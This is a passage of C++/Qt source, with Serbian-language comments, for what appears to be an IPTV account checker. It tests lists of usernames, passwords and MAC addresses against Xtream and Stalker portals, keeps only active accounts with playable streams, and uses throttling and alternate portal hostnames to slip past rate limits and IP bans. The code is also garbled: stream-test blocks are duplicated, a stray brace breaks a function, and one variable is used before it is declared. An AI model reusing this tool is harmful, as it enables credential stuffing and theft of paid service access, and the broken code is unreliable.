            // 404 / 301-308 HARD-FAIL
            if (r.status_code == 404 || r.status_code == 410 || r.status_code == 418 ||
                r.status_code == 301 || r.status_code == 302 ||
                r.status_code == 307 || r.status_code == 308) {
                qDebug() << "[API] HTTP" << r.status_code << "→ hard_fail";
                return false;
            }
            
            // 403 NGINX BAN
            if (r.status_code == 403) {
                qDebug() << "[BAN DETECTED] HTTP 403 prazan body → NGINX RATE-LIMIT!";
                qDebug() << "[BAN] Body size:" << r.text.size() << "bytes (trebalo bi biti 0)";
                qDebug() << "[BAN] Server:" << QString::fromStdString(r.header.count("Server") ? r.header.at("Server") : "unknown");
                
                std::lock_guard<std::mutex> _lkn(m_nginxBanMutex);
                if (!m_nginxBanReported.contains(base)) {
                    m_nginxBanReported.insert(base);
                    QString _report = QString(
                        "🚨 HTTP 403 — NGINX RATE-LIMIT BAN DETEKTOVAN!\n"
                        "Server: %1\n"
                        "Razlog: Previše zahtjeva u kratkom vremenu\n"
                        "Akcija: SKENIRANJE ZAUSTAVLJENO"
                    ).arg(base);
                    emit serverBanDetected(base, _report);
                    m_stopRequested.store(true, std::memory_order_release);
                }
                return false;
            }
            
            // 200 OK
            if (r.status_code == 200) {
                std::string ct = r.header.count("Content-Type") ? r.header.at("Content-Type") : "";
                std::string ctLow = ct;
                std::transform(ctLow.begin(), ctLow.end(), ctLow.begin(), ::tolower);
                
                qDebug() << "[API RESPONSE] Status:" << api_status 
                         << "| Size:" << r.text.size() 
                         << "| CT:" << QString::fromStdString(ct);
                
                // INVALID_CREDENTIALS CHECK
                if (ctLow.find("text/html") != std::string::npos) {
                    std::string bodyStart = r.text.substr(0, qMin(r.text.size(), (size_t)120));
                    
                    if (bodyStart.find("INVALID_CREDENTIALS") != std::string::npos) {
                        qDebug() << "[API] INVALID_CREDENTIALS detektovan → INSTANT HARD-FAIL!";
                        return false;
                    }
                }
                
                // JSON PARSE
                try {
                    auto d  = json::parse(r.text);
                    auto ui = d.value("user_info", json::object());
                    
                    std::string statusStr;
                    if (ui.contains("status") && !ui["status"].is_null()) {
                        statusStr = ui["status"].get<std::string>();
                        std::transform(statusStr.begin(), statusStr.end(), statusStr.begin(), ::tolower);
                    }
                    if (statusStr != "active") return false;
                    
                    // Ekstraktuj exp_date
                    if (ui.contains("exp_date") && !ui["exp_date"].is_null()) {
                        auto er = ui["exp_date"];
                        qint64 expTs = 0;
                        if (er.is_number()) expTs = er.get<qint64>();
                        else if (er.is_string()) {
                            std::string s = er.get<std::string>();
                            if (!s.empty() && s != "None" && s != "null" && s != "0") {
                                try { expTs = std::stoll(s); } catch (...) {}
                            }
                        }
                        if (expTs > 1000000000LL) {
                            qint64 now = QDateTime::currentSecsSinceEpoch();
                            if (expTs < now) return false;
                            exp_date = QDateTime::fromSecsSinceEpoch(expTs).toString("dd.MM.yyyy");
                        } else {
                            exp_date = "Unlimited";
                        }
                    }
                    
                    // Ekstraktuj max_connections
                    try {
                        if (ui.contains("max_connections") && !ui["max_connections"].is_null()) {
                            if (ui["max_connections"].is_string()) 
                                max_conn = std::stoi(ui["max_connections"].get<std::string>());
                            else 
                                max_conn = ui["max_connections"].get<int>();
                        }
                    } catch (...) {}
                    
                    // Ekstraktuj active_connections
                    try {
                        if (ui.contains("active_cons") && !ui["active_cons"].is_null()) {
                            if (ui["active_cons"].is_string()) 
                                active_cons = QString::fromStdString(ui["active_cons"].get<std::string>());
                            else 
                                active_cons = QString::number(ui["active_cons"].get<int>());
                        }
                    } catch (...) {}
                    
                    api_auth_ok = true;
                    qDebug() << "[API] ✅ OK — exp=" << exp_date << "max_conn=" << max_conn;
                    
                } catch (...) {
                    qDebug() << "[API] JSON parse fail → not auth";
                    return false;
                }
            }
            
        } catch (...) {
            qDebug() << "[API] Exception → return false";
            return false;
        }
    }
    
    if (m_stopRequested.load(std::memory_order_acquire)) return false;

    // ═══ STREAM TEST - MAX 3 KANALA SA PAUZOM ═══
    QString m3uUrl = buildM3uUrl(link);
    std::string m3u_raw;
    QList<SmartChannel> testChannels;

    if (!m3uUrl.isEmpty() && !m_stopRequested.load(std::memory_order_acquire)) {
        try {
            cpr::Response r = cpr::Get(
                cpr::Url{m3uUrl.toStdString()},
                cpr::Timeout(12000),
                cpr::VerifySsl{false},
                cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()}},
                cpr::WriteCallback{[&](const std::string_view data, intptr_t) -> bool {
                    m3u_raw.append(data.data(), data.size());
                    if (m3u_raw.size() >= 500000) return false;
                    return true;
                }}
            );
            
            qDebug() << "[M3U DOWNLOAD] URL:" << m3uUrl.left(80);
            qDebug() << "[M3U DOWNLOAD] Status:" << r.status_code 
                     << "| Size:" << m3u_raw.size() 
                     << "bytes";
            
            if (r.status_code == 403) {
                qDebug() << "[M3U] HTTP 403 → NGINX BAN detektovan pri M3U downloadanju!";
                return false;
            }
            
        } catch (...) {
            qDebug() << "[M3U DOWNLOAD] Exception → continue";
        }
    }

    // M3U PARSE
    if (!m3u_raw.empty()) {
        size_t s0 = 0;
        if (m3u_raw.size() >= 3 &&
            (unsigned char)m3u_raw[0] == 0xEF &&
            (unsigned char)m3u_raw[1] == 0xBB &&
            (unsigned char)m3u_raw[2] == 0xBF) s0 = 3;
        while (s0 < m3u_raw.size() &&
               (m3u_raw[s0]==' '||m3u_raw[s0]=='\r'||m3u_raw[s0]=='\n'||m3u_raw[s0]=='\t')) ++s0;

        if (m3u_raw.size()-s0 >= 7 && m3u_raw.substr(s0,7) == "#EXTM3U") {
            QString m3u_text = QString::fromStdString(m3u_raw.substr(s0));
            QList<QString> all_streams = extractStreamsFromM3U(m3u_text, base);

            if (!all_streams.isEmpty()) {
                testChannels = smartSelectChannels(all_streams, base);
                qDebug() << "[M3U PARSE] smartSelect chose" << testChannels.size() << "channels";
            }
        }
    }

    if (m_stopRequested.load(std::memory_order_acquire)) return false;

    // STREAM TEST: MAX 3 KANALA SA PAUZOM
    int maxChannelsToTest = qMin(testChannels.size(), 3);
    int testedChannels = 0;

    for (const SmartChannel &sc : testChannels) {
        if (testedChannels >= maxChannelsToTest) break;
        ++testedChannels;
        if (m_stopRequested.load(std::memory_order_acquire)) return false;

        // 3-SEKUNDNA PAUZA
        qDebug() << "[STREAM TEST] Pauza 3s pre kanala" << testedChannels << "/" << maxChannelsToTest;
        for (int _w = 0; _w < 30 && !m_stopRequested.load(); _w++)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));

        try {
            std::string body; 
            cpr::Response r = cpr::Get(
                cpr::Url{sc.url.toStdString()},
                cpr::Timeout(8000),
                cpr::VerifySsl{false},
                cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()},
                            {"Accept", "*/*"}, 
                            {"Connection", "keep-alive"}},
                cpr::WriteCallback{[&](const std::string_view data, intptr_t) -> bool {
                    body.append(data.data(), data.size());
                    if (body.size() >= 8192) return false;
                    return true;
                }}
            );

            int status = r.status_code;

            qDebug() << "[STREAM TEST RESULT]";
            qDebug() << "  URL:" << sc.url.left(80);
            qDebug() << "  Status:" << status << "| Bytes:" << body.size();
            
            std::string ct = r.header.count("Content-Type") ? r.header.at("Content-Type") : "";
            std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
            qDebug() << "  Content-Type:" << QString::fromStdString(ct);
            qDebug() << "  Body[:50]:" << QString::fromStdString(body.substr(0, 50));

            if (status == 0) continue;
            if (status == 404) continue;
            if (status == 503) continue;
            
            // 302 REDIRECT
            if (status == 302 || status == 301 || status == 307 || status == 308) {
                std::string location = r.header.count("Location") ? r.header.at("Location") : "";
                if (!location.empty() && location.find("http") == 0) {
                    try {
                        std::string body2;
                        cpr::Response r2 = cpr::Get(
                            cpr::Url{location},
                            cpr::Timeout(8000),
                            cpr::VerifySsl{false},
                            cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()},
                                        {"Accept", "*/*"}, 
                                        {"Connection", "keep-alive"}},
                            cpr::WriteCallback{[&](const std::string_view d, intptr_t) -> bool {
                                body2.append(d.data(), d.size());
                                if (body2.size() >= 8192) return false;
                                return true;
                            }}
                        );
                        int s2 = r2.status_code;
                        if (s2 == 200 || s2 == 206) {
                            std::string ct2 = r2.header.count("Content-Type") ? r2.header.at("Content-Type") : "";
                            std::transform(ct2.begin(), ct2.end(), ct2.begin(), ::tolower);
                            if (isRealMediaBody(body2, ct2)) {
                                qDebug() << "[STREAM 302] ✅ REDIRECT OK → PLAYABLE";
                                return fillResult();
                            }
                        }
                    } catch (...) {}
                }
                continue;
            }

            if (status != 200 && status != 206) continue;

            // HTML GREŠKA CHECK
            std::string bodyStart = body.substr(0, qMin(body.size(), (size_t)200));
            std::transform(bodyStart.begin(), bodyStart.end(), bodyStart.begin(), ::tolower);
            
            if (bodyStart.find("<html") != std::string::npos ||
                bodyStart.find("<!doctype") != std::string::npos ||
                bodyStart.find("invalid") != std::string::npos) {
                
                qDebug() << "[STREAM ERROR] HTML greška detektovana!";
                qDebug() << "[STREAM ERROR] Body[:100]:" << QString::fromStdString(body.substr(0, 100));
                qDebug() << "[STREAM ERROR] Status:" << status << "| Size:" << body.size() << "bytes";
                
                if (body.find("INVALID_CREDENTIALS") != std::string::npos) {
                    qDebug() << "[STREAM] INVALID_CREDENTIALS → hard fail ova lista";
                    return false;
                }
                
                qDebug() << "[STREAM] HTML greška → skip ovaj kanal, probaj sljedeći";
                continue;
            }

            if (!isRealMediaBody(body, ct)) {
                qDebug() << "[STREAM] Nije pravi media (size=" << body.size() << ") → next";
                continue;
            }

            qDebug() << "[STREAM] ✅ PRAVI MEDIA DETEKTOVAN → PLAYABLE!";
            return fillResult();

        } catch (...) {
            continue;
        }
    }

    qDebug() << "[CP] Stream testovi neuspešni → return false";
    return false;
}
    
    if (m_stopRequested.load(std::memory_order_acquire)) return false;

       // ── DINAMIČKA PAUZA - PROTIV BANA ──
    {
        auto* rt = getReactThrottle(base);
        int minDelay;
        {
            std::lock_guard<std::mutex> lk(rt->mx);
            int eps = g_xuiEpisodeCount.value(base, 0);
            
            // Ako je Debug Mode aktivan, SIGURNO pojačaj pauz!
            bool isDebugActive = isXuiDebugMode(base);
            
            if (isDebugActive) {
                // XUI Debug Mode = server preopterećen → stroga pauza!
                minDelay = 10000;  // 10 SEKUNDI!
                qDebug() << "[DYNAMIC THROTTLE] Server preopterećen (Debug Mode) → pauza 10s";
            } else if (eps >= 5) {
                minDelay = 8000;
            } else if (eps >= 3) {
                minDelay = 6000;
            } else if (eps >= 1) {
                minDelay = 3000;
            } else if (rt->isAggressive) {
                minDelay = 1500;
            } else {
                minDelay = 200;
            }
        }
        qDebug() << "[THROTTLE] base=" << base << "minDelay=" << minDelay << "ms";
        seqThrottleWait(base, minDelay, m_stopRequested);
    }

    if (m_stopRequested.load(std::memory_order_acquire)) return false;

    // ═══ FAZA 2: STREAM TEST — JEDINI SUDIJA JE PRAVI MEDIA ═══
    // Testiraj MAX 3 STREAMA sa 3-sekundnom pauzom između
    
    const QString _eu = QString::fromUtf8(QUrl::toPercentEncoding(username, "@._-"));
    const QString _ep = QString::fromUtf8(QUrl::toPercentEncoding(password, "@._-!"));

    // ── M3U DOWNLOAD ──
    QString m3uUrl = buildM3uUrl(link);
    std::string m3u_raw;
    QList<SmartChannel> testChannels;

    if (!m3uUrl.isEmpty() && !m_stopRequested.load(std::memory_order_acquire)) {
        try {
            bool stopped_early = false;
            int effective_m3u_timeout = m_stopRequested.load() ? 300 : 12000;
            
            xuiAnalyzerBefore(base, "m3u", m3uUrl);
            if (!getXuiAnalysis(base)->events.isEmpty()) {
                std::lock_guard<std::mutex> _pslk(g_serverSemMutex);
                getXuiAnalysis(base)->events.last().activeSlots = g_serverActiveCalls.value(base, 0);
            }
            
                        cpr::Response r = cpr::Get(
                cpr::Url{m3uUrl.toStdString()},
                cpr::Timeout{effective_m3u_timeout},
                cpr::VerifySsl{false},
                cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()}},
                cpr::WriteCallback{[&](const std::string_view data, intptr_t) -> bool {
                    m3u_raw.append(data.data(), data.size());
                    if (m3u_raw.size() >= 500000) { stopped_early = true; return false; }
                    return true;
                }}
            );
            
            xuiAnalyzerAfter(base, r.status_code, false, (int)m3u_raw.size());
            
            qDebug() << "[M3U DOWNLOAD] URL:" << m3uUrl.left(80);
            qDebug() << "[M3U DOWNLOAD] Status:" << r.status_code 
                     << "| Size:" << m3u_raw.size() 
                     << "bytes | StoppedEarly:" << stopped_early;
            
            if (r.status_code == 403) {
                qDebug() << "[M3U] HTTP 403 → NGINX BAN detektovan pri M3U downloadanju!";
                return false;
            }
            
        } catch (...) {
            qDebug() << "[M3U DOWNLOAD] Exception → continue";
        }
    }

    // ── M3U PARSE ──
    if (!m3u_raw.empty()) {
        size_t s0 = 0;
        if (m3u_raw.size() >= 3 &&
            (unsigned char)m3u_raw[0] == 0xEF &&
            (unsigned char)m3u_raw[1] == 0xBB &&
            (unsigned char)m3u_raw[2] == 0xBF) s0 = 3;
        while (s0 < m3u_raw.size() &&
               (m3u_raw[s0]==' '||m3u_raw[s0]=='\r'||m3u_raw[s0]=='\n'||m3u_raw[s0]=='\t')) ++s0;

        if (m3u_raw.size()-s0 >= 7 && m3u_raw.substr(s0,7) == "#EXTM3U") {
            QString m3u_text = QString::fromStdString(m3u_raw.substr(s0));
            QList<QString> all_streams = extractStreamsFromM3U(m3u_text, base);

            if (!all_streams.isEmpty()) {
                testChannels = smartSelectChannels(all_streams, base);
                qDebug() << "[M3U PARSE] smartSelect chose" << testChannels.size() << "channels";
            }
        }
    }

    if (m_stopRequested.load(std::memory_order_acquire)) return false;

        // ── STREAM TEST: MAX 3 KANALA SA PAUZOM ──
    int maxChannelsToTest = qMin(testChannels.size(), 3);  // ← LIMIT NA 3!
    int testedChannels = 0;

    for (const SmartChannel &sc : testChannels) {
        if (testedChannels >= maxChannelsToTest) break;
        ++testedChannels;
        if (m_stopRequested.load(std::memory_order_acquire)) return false;

        // ── 3-SEKUNDNA PAUZA ──
        qDebug() << "[STREAM TEST] Pauza 3s pre kanala" << testedChannels << "/" << maxChannelsToTest;
        for (int _w = 0; _w < 30 && !m_stopRequested.load(); _w++)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));

        try {
            xuiAnalyzerBefore(base, "stream", sc.url);
            if (!getXuiAnalysis(base)->events.isEmpty()) {
                std::lock_guard<std::mutex> _pslk(g_serverSemMutex);
                getXuiAnalysis(base)->events.last().activeSlots = g_serverActiveCalls.value(base, 0);
            }

            std::string body; bool stopped_early = false;
            cpr::Response r = cpr::Get(
                cpr::Url{sc.url.toStdString()},
                cpr::Timeout{m_stopRequested.load() ? 300 : 8000},
                cpr::VerifySsl{false},
                cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()},
                            {"Accept", "*/*"}, {"Connection", "keep-alive"}},
                cpr::WriteCallback{[&](const std::string_view data, intptr_t) -> bool {
                    body.append(data.data(), data.size());
                    if (body.size() >= 8192) { stopped_early = true; return false; }
                    return true;
                }}
            );

            int status = stopped_early
                ? ((r.status_code != 0) ? r.status_code : 200)
                : r.status_code;

                        qDebug() << "[STREAM TEST RESULT]";
            qDebug() << "  URL:" << sc.url.left(80);
            qDebug() << "  Status:" << status << "| Bytes:" << body.size();
            qDebug() << "  Content-Type:" << QString::fromStdString(ct);
            qDebug() << "  Body[:50]:" << QString::fromStdString(body.substr(0, 50));

            xuiAnalyzerAfter(base, status, false, (int)body.size());

            if (status == 0) continue;  // Timeout
            if (status == 404) continue;  // Not found
            if (status == 503) continue;  // Server down
            
            // ── 302 REDIRECT ──
            if (status == 302 || status == 301 || status == 307 || status == 308) {
                std::string location = r.header.count("Location") ? r.header.at("Location") : "";
                if (!location.empty() && location.find("http") == 0) {
                    try {
                        std::string body2; bool stopped2 = false;
                        cpr::Response r2 = cpr::Get(
                            cpr::Url{location},
                            cpr::Timeout{m_stopRequested.load() ? 300 : 8000},
                            cpr::VerifySsl{false},
                            cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()},
                                        {"Accept", "*/*"}, {"Connection", "keep-alive"}},
                            cpr::WriteCallback{[&](const std::string_view d, intptr_t) -> bool {
                                body2.append(d.data(), d.size());
                                if (body2.size() >= 8192) { stopped2 = true; return false; }
                                return true;
                            }}
                        );
                        int s2 = r2.status_code;
                        if (stopped2 && s2 == 0) s2 = 200;
                        if (s2 == 200 || s2 == 206 || stopped2) {
                            std::string ct2 = r2.header.count("Content-Type") ? r2.header.at("Content-Type") : "";
                            std::transform(ct2.begin(), ct2.end(), ct2.begin(), ::tolower);
                            if (isRealMediaBody(body2, ct2)) {
                                qDebug() << "[STREAM 302] ✅ REDIRECT OK → PLAYABLE";
                                resetXuiDebug(base);
                                return fillResult();
                            }
                        }
                    } catch (...) {}
                }
                continue;
            }

            if (status != 200 && status != 206) continue;

                        std::string ct = r.header.count("Content-Type") ? r.header.at("Content-Type") : "";
            std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
            
            // ✅ POBOLJŠANA DETEKTOVANJE - Provjeri prvo HTML greške
            std::string bodyStart = body.substr(0, std::min(body.size(), (size_t)200));
            std::transform(bodyStart.begin(), bodyStart.end(), bodyStart.begin(), ::tolower);
            
                        // HTML greška = server problema
            if (bodyStart.find("<html") != std::string::npos ||
                bodyStart.find("<!doctype") != std::string::npos ||
                bodyStart.find("invalid") != std::string::npos) {
                
                qDebug() << "[STREAM ERROR] HTML greška detektovana!";
                qDebug() << "[STREAM ERROR] Body[:100]:" << QString::fromStdString(body.substr(0, 100));
                qDebug() << "[STREAM ERROR] Status:" << status << "| Size:" << body.size() << "bytes";
                
                if (body.find("INVALID_CREDENTIALS") != std::string::npos) {
                    qDebug() << "[STREAM] INVALID_CREDENTIALS → hard fail ova lista";
                    return false;  // INSTANT HARD-FAIL - INVALID KREDENCIJALI
                }
                
                qDebug() << "[STREAM] HTML greška → skip ovaj kanal, probaj sljedeći";
                continue;  // Preskočі ovaj kanal, probaj sljedeći
            }
            
            // Sada provjeravamo da li je pravi media
            if (!isRealMediaBody(body, ct)) {
                qDebug() << "[STREAM] Nije pravi media (size=" << body.size() << ") → next";
                continue;
            }

            qDebug() << "[STREAM] ✅ PRAVI MEDIA DETEKTOVAN → PLAYABLE!";
            xuiAnalyzerAfter(base, status, false, (int)body.size());
            resetXuiDebug(base);
            return fillResult();

        } catch (...) {
            continue;
        }
    }

    qDebug() << "[CP] Stream testovi neuspešni → return false";
    return false;
}
};
// ═══════════════════════════════════════════════════════════════════
// SERVER BAN / RATE-LIMIT DETEKCIJA
// ═══════════════════════════════════════════════════════════════════

struct ServerBanState {
    std::atomic<int> consecutiveHandshakeFails{0};
    std::atomic<int> consecutive401Streams{0};
    QDateTime        cooldownExpiry;
    bool             inCooldown = false;
};

static std::mutex                       g_banMutex;
static QMap<QString, ServerBanState*>   g_serverBan;

static ServerBanState* getBanState(const QString &serverKey) {
    std::lock_guard<std::mutex> lk(g_banMutex);
    if (!g_serverBan.contains(serverKey))
        g_serverBan[serverKey] = new ServerBanState();
    return g_serverBan[serverKey];
}

static bool isServerBanned(const QString &serverKey) {
    auto* s = getBanState(serverKey);
    if (!s->inCooldown) return false;
    if (s->cooldownExpiry < QDateTime::currentDateTime()) {
        s->inCooldown = false;
        s->consecutiveHandshakeFails = 0;
        s->consecutive401Streams     = 0;
        return false;
    }
    return true;
}

static int serverBanCooldownSecs(const QString &serverKey) {
    auto* s = getBanState(serverKey);
    if (!s->inCooldown) return 0;
    return qMax(0, (int)QDateTime::currentDateTime().secsTo(s->cooldownExpiry));
}

static void recordHandshakeFail(const QString &serverKey) {
    auto* s = getBanState(serverKey);
    int n = ++s->consecutiveHandshakeFails;
    if (n >= 5 && !s->inCooldown) {
        s->inCooldown      = true;
        s->cooldownExpiry  = QDateTime::currentDateTime().addSecs(120);
        qDebug() << "[BAN] Server" << serverKey
                 << "— 5 consecutive handshake fails → 120s cooldown";
    }
}

static void recordHandshakeOk(const QString &serverKey) {
    auto* s = getBanState(serverKey);
    s->consecutiveHandshakeFails = 0;
    s->inCooldown = false;  // ← DODATO: resetuj cooldown ako server ponovo radi
}

static void recordStream401(const QString &serverKey) {
    auto* s = getBanState(serverKey);
    int n = ++s->consecutive401Streams;
    if (n >= 30 && !s->inCooldown) {
        s->inCooldown     = true;
        s->cooldownExpiry = QDateTime::currentDateTime().addSecs(15);
        qDebug() << "[BAN] Server" << serverKey
                 << "— 15 consecutive stream 401s → 30s cooldown";
    }
}

static void recordStreamOk(const QString &serverKey) {
    auto* s = getBanState(serverKey);
    s->consecutive401Streams = 0;
    s->inCooldown            = false;
}

// WAF/IP ban — duži cooldown od normalnog handshake bana
static void recordWafBan(const QString &serverKey, int cooldownSecs = 86400) {
    auto* s = getBanState(serverKey);
    s->inCooldown      = true;
    s->cooldownExpiry  = QDateTime::currentDateTime().addSecs(cooldownSecs);
    s->consecutiveHandshakeFails = 0;
    qDebug() << "[WAF-BAN] Server" << serverKey
             << "— IP blokada →" << cooldownSecs << "s cooldown";
}

// ═══════════════════════════════════════════════════════════════════
// PORTAL VARIANT DISCOVERY
// ═══════════════════════════════════════════════════════════════════

static QList<QString> generatePortalVariants(const QString &portal) {
    QList<QString> variants;
    QUrl url(portal);
    QString host    = url.host();
    QString scheme  = url.scheme();
    QString path    = "/c/";
QStringList parts = host.split('.');
    if (parts.size() > 2) {
        // Strip celog prvog subdomena: sport-birutv.my.id → my.id
        QString stripped = parts.mid(1).join('.');
        variants << QString("%1://%2%3").arg(scheme, stripped, path);
        variants << QString("%1://%2:8080%3").arg(scheme, stripped, path);

        // Strip samo prefiksa sa crticom: sport-birutv.my.id → birutv.my.id
        QString firstPart = parts[0]; // "sport-birutv"
        int dashPos = firstPart.indexOf('-');
        if (dashPos > 0) {
            QString withoutPrefix = firstPart.mid(dashPos + 1); // "birutv"
            QString altHost = withoutPrefix + "." + parts.mid(1).join('.');
            variants << QString("%1://%2%3").arg(scheme, altHost, path);
            variants << QString("%1://%2:8080%3").arg(scheme, altHost, path);
        }
    }
    int port = url.port();
    if (port == 80 || port == -1) {
        variants << QString("%1://%2:8080%3").arg(scheme, host, path);
        variants << QString("https://%1%2").arg(host, path);
    } else if (port == 8080) {
        variants << QString("%1://%2:80%3").arg(scheme, host, path);
        variants << QString("%1://%2%3").arg(scheme, host, path);
    }
    if (host.startsWith("www.")) {
        QString noWww = host.mid(4);
        variants << QString("%1://%2%3").arg(scheme, noWww, path);
        variants << QString("%1://%2:8080%3").arg(scheme, noWww, path);
    }
    QList<QString> unique;
    QSet<QString> seen;
    for (const QString &v : variants) {
        if (!seen.contains(v) && v != portal) {
            seen.insert(v);
            unique.append(v);
        }
    }
    return unique;
}

// ═══════════════════════════════════════════════════════════════════
// MacWorker KLASA
// ═══════════════════════════════════════════════════════════════════

class MacWorker : public QObject {
    Q_OBJECT
public:
    MacWorker(QObject *parent = nullptr) : QObject(parent), m_stopRequested(false) {}
    void requestStop() { m_stopRequested.store(true, std::memory_order_release); }
    bool isStopped() const { return m_stopRequested.load(std::memory_order_acquire); }

signals:
    void progressUpdated(int current, int total, double speed);
    void resultFound(const CheckResultMac &result);
    void checkFinished(bool wasStopped);
    void phaseChanged(const QString &text);
    void portalProbeReport(const QString &reportText);

public slots:
    void runMacCheck(const QList<QString> &portals, const QList<QString> &macs) {
        int total = portals.size() * macs.size();
        QDateTime startTime = QDateTime::currentDateTime();

        // ── DNS PRE-REZOLUCIJA ──
        {
            QSet<QString> uniqueHosts;
            for (const QString &p : portals) {
                QUrl pu(p.trimmed());
                QString h = pu.host();
                if (!h.isEmpty()) uniqueHosts.insert(h);
            }
            if (!uniqueHosts.isEmpty()) {
                QList<QString> hostList = uniqueHosts.values();
            auto _dnsIgnored = std::async(std::launch::async, [hostList]() {
                    batchDnsResolve(hostList);
                });
                (void)_dnsIgnored;
            }
        }

qDebug() << "[TIMING] runMacCheck START enqueue:"
                 << QDateTime::currentDateTime().toString("HH:mm:ss.zzz")
                 << "portals=" << portals.size() << "macs=" << macs.size();

        std::mutex progressMutex;
        std::atomic<int> processedCount(0);
        std::atomic<bool> &stopFlag = m_stopRequested;

// ── PORTAL PRE-PROBE: samo keširani rezultati, bez čekanja ──
        QSet<QString> skipPortals;
        {
            for (const QString &portal : portals) {
                QString pt = portal.trimmed();
                if (pt.isEmpty()) continue;
                std::lock_guard<std::mutex> lk(g_portalProbeMutex);
                int cachedResult = g_portalProbeResult.value(pt, 0);
                if (cachedResult == 2 || cachedResult == 3)
                    skipPortals.insert(pt);
            }
        }

        // ── Emituj izveštaj o nedostupnim portalima (jedan popup) ──
        if (!skipPortals.isEmpty()) {
            QString report;
            QString now = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm:ss");
            for (const QString &pt : portals) {
                if (!skipPortals.contains(pt.trimmed())) continue;
                int probeResult = 0;
                {
                    std::lock_guard<std::mutex> lk(g_portalProbeMutex);
                    probeResult = g_portalProbeResult.value(pt.trimmed(), 0);
                }
                QString status;
                if (probeResult == 3)
                    status = "🔒 BAN IP (HTTP 403 / CF 520 / 429) — BAN IP na 24h, pokušaj ponovo sutra";
                else
                    status = "💀 PORTAL MRTAV — Server ne odgovara (timeout / nema konekcije)";
                report += QString("Portal: %1\nStatus: %2\nVreme: %3\n")
                    .arg(pt, status, now);
            }
            emit portalProbeReport(report);
        }

        emit phaseChanged(QString("MAC Provera: %1 portala × %2 mac-ova...").arg(portals.size()).arg(macs.size()));

        // Broj threadova: 1 per server (acquireServerSlot to garantuje),
        // ali više threadova za paralelnu obradu više portala istovremeno
        StdThreadPool pool(16);
        // Per-scan tracking — briše se automatski pri svakom novom pozivu runMacCheck
        auto reportedServersMutex = std::make_shared<std::mutex>();
        auto reportedServersSet   = std::make_shared<QSet<QString>>();

        for (const QString &portal : portals) {
            // ── Preskoči portale koji su mrtvi ili blokiraju našu IP ──
            if (skipPortals.contains(portal.trimmed())) {
                processedCount += macs.size();
                int c = processedCount.load();
                qint64 el = startTime.msecsTo(QDateTime::currentDateTime());
                emit this->progressUpdated(c, total, el > 0 ? c*1000.0/el : 0.0);
                continue;
            }

            for (const QString &mac : macs) {
                if (stopFlag.load(std::memory_order_acquire)) break;

                QString portalCopy = portal.trimmed();
                QString macCopy    = mac.trimmed();
                QUrl _pu(portalCopy);
                int _pp = _pu.port(); if (_pp <= 0) _pp = 80;
                QString baseCopy = _pu.host().toLower() + ":" + QString::number(_pp);

                pool.enqueue([this, portalCopy, macCopy, baseCopy, total,
                              &processedCount, &progressMutex, startTime, &stopFlag,
                              reportedServersMutex, reportedServersSet]() {

                    auto updateProgress = [&]() {
                        std::lock_guard<std::mutex> lock(progressMutex);
                        int c = ++processedCount;
                        qint64 el = startTime.msecsTo(QDateTime::currentDateTime());
                        emit this->progressUpdated(c, total, el > 0 ? c*1000.0/el : 0.0);
                    };

                    if (stopFlag.load(std::memory_order_acquire)) { updateProgress(); return; }

                // Anti-ban: čekaj ako je server u cooldown-u
                // CF ban → preskoči odmah bez čekanja
                {
                    if (!stopFlag.load(std::memory_order_acquire) && isServerBanned(baseCopy)) {
                        bool shouldReport = false;
                        {
                            std::lock_guard<std::mutex> lk(*reportedServersMutex);
                            if (!reportedServersSet->contains(baseCopy)) {
                                reportedServersSet->insert(baseCopy);
                                shouldReport = true;
                            }
                        }
                        if (shouldReport) {
                            QString now = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm:ss");
                            // Odredi tip bana
                            auto* banS = getBanState(baseCopy);
                            int remainingSecs = serverBanCooldownSecs(baseCopy);
                            // Odredi tip bana i trajanje na osnovu stanja
                            auto* banS2 = getBanState(baseCopy);
                            int totalBanSecs = (int)QDateTime::currentDateTime().secsTo(banS2->cooldownExpiry);
                            QString banDuration;
                            QString banType;
                            if (totalBanSecs >= 82800) { // ~24h
                                banType     = "🔒 CLOUDFLARE IP BAN (HTTP 520)";
                                banDuration = "BAN IP na 24h — pokušaj ponovo sutra";
                            } else if (totalBanSecs >= 3000) { // ~1h
                                banType     = "🔒 SERVER-SIDE IP BLOCK (HTTP 403)";
                                banDuration = "BAN IP na 1h — pokušaj ponovo za sat vremena";
                            } else {
                                banType     = "⚠️ WAF RATE-LIMIT (HTTP 429)";
                                int mins = qMax(1, (totalBanSecs + 59) / 60);
                                banDuration = QString("Rate-limit na %1 min — pokušaj ponovo za %1 minuta").arg(mins);
                            }
                            QString report = QString(
                                "Portal: %1\nStatus: %2\nVreme: %3  %4\n"
                            ).arg(portalCopy, banType, now, banDuration);
                            emit this->portalProbeReport(report);
                        }
                        updateProgress();
                        return;
                    }
                }

// Reaktivni throttle — prilagođava se odgovorima servera
                    reactiveWait(baseCopy);

if (stopFlag.load(std::memory_order_acquire)) { updateProgress(); return; }

// Dinamičan broj slotova: 1 za agresivne servere (503/429), 2 za normalne
                    {
    auto* _rt = getReactThrottle(baseCopy);
    int _maxSlots;
    {
        std::lock_guard<std::mutex> _lk(_rt->mx);
        // Slow-scan server (ima Debug Mode epizode) → uvek 1 slot
        _maxSlots = (isXuiSlowServer(baseCopy) || _rt->isAggressive) ? 1 : 2;
    }
    acquireServerSlot(baseCopy, _maxSlots, stopFlag);
}

                    if (stopFlag.load(std::memory_order_acquire)) {
                        releaseServerSlot(baseCopy);
                        updateProgress();
                        return;
                    }

                    try {
                        CheckResultMac result;
                        bool ok = checkMacPlayable(portalCopy, macCopy, result);
                        if (ok && !stopFlag.load()) {
                            emit resultFound(result);
                        }
                    } catch (...) {}

                    releaseServerSlot(baseCopy);
                    updateProgress();
                });
            }
            if (stopFlag.load(std::memory_order_acquire)) break;
        }

        pool.waitForAllOrStop(stopFlag);
        emit checkFinished(m_stopRequested.load());
    }

private:
    std::atomic<bool> m_stopRequested;

// ─────────────────────────────────────────────────────────────
